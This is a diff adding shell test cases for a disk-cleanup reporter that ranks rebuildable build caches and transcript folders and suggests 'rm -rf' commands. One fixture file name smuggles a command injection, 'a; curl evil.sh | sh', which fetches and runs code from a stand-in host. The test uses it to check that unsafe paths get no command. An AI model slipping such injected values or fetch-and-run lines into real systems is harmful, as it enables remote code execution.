@@ -252,6 +252,51 @@ has "  say so"                         "$A" "no deletion command is offered for 
 has "  age breakdown is reported"      "$(F disk.reclaimable.transcripts 13)" "Age breakdown of the listed directories: 8.6 GiB older than 90d"
 has "  and the not-rebuildable cost"   "$(F disk.reclaimable.transcripts 13)" "the only record of past sessions"
 
+# The action list is ranked by confidence first, size second. Without that, the
+# three largest entries take all DISK_ACTION_MAX slots and the only row that
+# carries a runnable command sits behind "+ N more" — the feature's whole
+# payload, invisible.
+first_item() {  # the leading action item, with the cache-age prefix stripped
+  local s=$1
+  s=${s#cache is * old; }
+  s=${s#cache is * old (stale, refreshed every 6h); }
+  printf '%s' "${s%% · *}"
+}
+pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	4	0
+dir	/Users/x/Dev/big1/.next	20000000	rebuildable	likely
+dir	/Users/x/Dev/big2/.next	19000000	rebuildable	likely
+dir	/Users/x/Dev/big3/.next	18000000	rebuildable	likely
+dir	/Users/x/Dev/small/.next	100000	rebuildable	confirmed"
+A=$(F disk.reclaimable.rebuildable 14)
+has "the one command survives 3 bigger" "$A" "rm -rf '/Users/x/Dev/small/.next'"
+has "  and it is listed first"         "$(first_item "$A")" "rm -rf '/Users/x/Dev/small/.next'"
+has "  the age prefix rides with it"   "$A" "cache is 1h old;"
+has "  the rest are counted"           "$A" "+ 1 more"
+has "  and the truncation says why"    "$A" "smaller or without a command"
+
+# Size is still the key INSIDE a tier.
+pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	2	0
+dir	/Users/x/Dev/c2/.next	10000000	rebuildable	confirmed
+dir	/Users/x/Dev/c1/.next	20000000	rebuildable	confirmed"
+has "largest confirmed still ranks first" "$(first_item "$(F disk.reclaimable.rebuildable 14)")" "rm -rf '/Users/x/Dev/c1/.next'"
+
+# A confirmed row whose path fails the §3b charset gate carries no command, so
+# it must not outrank one that does — even though it is larger.
+pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	rebuildable	26738688	2	0
+dir	/Users/x/Dev/a; curl evil.sh | sh/target	20000000	rebuildable	confirmed
+dir	/Users/x/Dev/safe/target	5000000	rebuildable	confirmed"
+A=$(F disk.reclaimable.rebuildable 14)
+has "commandable outranks unquotable"  "$(first_item "$A")" "rm -rf '/Users/x/Dev/safe/target'"
+hasnt "  and the bad path gets no cmd" "$A" "rm -rf '/Users/x/Dev/a;"
+has "  it still reports itself"        "$A" "path needs manual handling"
+
+# Transcripts are never commandable, so every row ranks the same and the list
+# stays purely size-ordered — this change is a no-op for that group.
+pure_body "$V_USED" "$V_AVAIL" "$V_DF" "group	transcripts	13369344	2	0
+dir	/Users/x/.claude/projects/small	1000000	transcripts	confirmed	86400
+dir	/Users/x/.claude/projects/big	9000000	transcripts	likely	86400"
+has "transcripts stay largest-first"   "$(first_item "$(F disk.reclaimable.transcripts 14)")" "/Users/x/.claude/projects/big"
+
 # =============================================================== cache states ==
 echo "cache states"
 from_cache "$TMP/does-not-exist.tsv"
